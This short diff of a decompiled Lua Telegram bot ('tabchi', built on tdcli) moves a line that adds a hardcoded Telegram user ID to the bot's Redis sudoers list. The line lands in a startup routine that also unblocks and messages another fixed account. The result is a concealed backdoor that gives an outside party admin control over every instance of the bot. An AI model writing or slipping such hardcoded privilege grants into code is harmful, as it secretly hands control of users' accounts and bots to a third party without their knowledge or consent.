@@ -285,7 +285,6 @@ Decompiled by @sajjad_021
 TeleGram channel @tgMember
 enjoy your bot! ]]
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
-redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
       elseif text_:match("^[!/#](remsudo) (%d+)") then
         local matches = {
           text_:match("^[!/#](remsudo) (%d+)")
@@ -505,6 +504,7 @@ redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
     tdcli.unblockUser(231539308)
     tdcli.sendBotStartMessage(231539308, 231539308, "/start")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "html")
+    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
       local contact_num
       function contact_num(extra, result)
         redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
